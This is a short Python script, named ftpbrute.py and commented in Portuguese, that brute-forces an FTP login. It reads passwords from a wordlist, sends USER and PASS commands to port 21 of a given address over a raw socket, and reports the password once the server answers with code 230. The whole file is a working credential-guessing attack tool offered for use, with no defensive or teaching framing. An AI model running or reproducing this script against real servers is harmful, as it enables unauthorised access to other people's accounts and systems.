#!/usr/bin/python3.9
# -*- coding: utf-8 -*-
import re
import sys
import socket

if len(sys.argv) != 4:
    print("Use: python3 ftpbrute.py 127.0.0.1 usuario wordlist.txt")
    sys.exit(1)

addr = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]

try:
    arq = open(wordlist)
    linhas = arq.read().splitlines()
except:
    print("Lista INVÁLIDA !!!")
    sys.exit(1)

for linha in linhas:
    print("\nTestando com "+user+":"+linha)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((addr,21))
    s.recv(1024)
    send_user = "USER "+user+"\r\n"
    #usando o .encode para mandar mensagem em 'bytes-like'
    s.send(send_user.encode())
    s.recv(1024)
    send_pass = "PASS "+linha+"\r\n"
    # usando o .encode para mandar mensagem em 'bytes-like'
    s.send(send_pass.encode())
    result = s.recv(1024)
    send_quit = "QUIT\r\n"
    s.send(send_quit.encode())

    #usado o .decode para decodificar a resposta e comparar com uma string - '230'
    if re.search("230", result.decode()):
        print("[+] *** SENHA ENCONTRADA ***[+] ==> "+linha)
        break
    else:
        print("[-] ACESSO NEGADO [-]")

